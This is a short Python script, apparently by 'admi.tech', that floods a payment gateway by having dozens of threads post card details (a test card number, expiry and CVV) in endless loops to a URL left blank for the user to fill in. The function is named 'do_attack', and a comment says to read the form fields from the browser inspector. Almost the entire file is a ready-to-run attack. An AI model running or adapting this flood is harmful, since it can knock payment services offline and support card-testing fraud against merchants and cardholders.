###################################
# !/usr/bin/python
# Python 3.10
# (C) 2023 admi.tech
###################################

# Import main packages
import requests
import threading

# Global Variables
CARD_NUMBER = 4007000000027
EXP_MONTH = 10
EXP_YEAR = 23
CVV = 234


# Scripts

def do_attack():
    # Main loop
    while True:
        # Show answer from server
        answer = requests.post(URL, data=data).text
        print(answer)


if __name__ == "__main__":
    # URL where is payment gate
    URL = ' '

    # Data to send
    # Open browser inspector
    data = {
        "no": CARD_NUMBER,
        "expm": EXP_MONTH,
        "expy": EXP_YEAR,
        "cvv": CVV
    }

    threads = []

    for i in range(70):
        t = threading.Thread(target=do_attack)
        t.daemon = True
        threads.append(t)

    for i in range(50):
        threads[i].start()

    for i in range(50):
        threads[i].join()
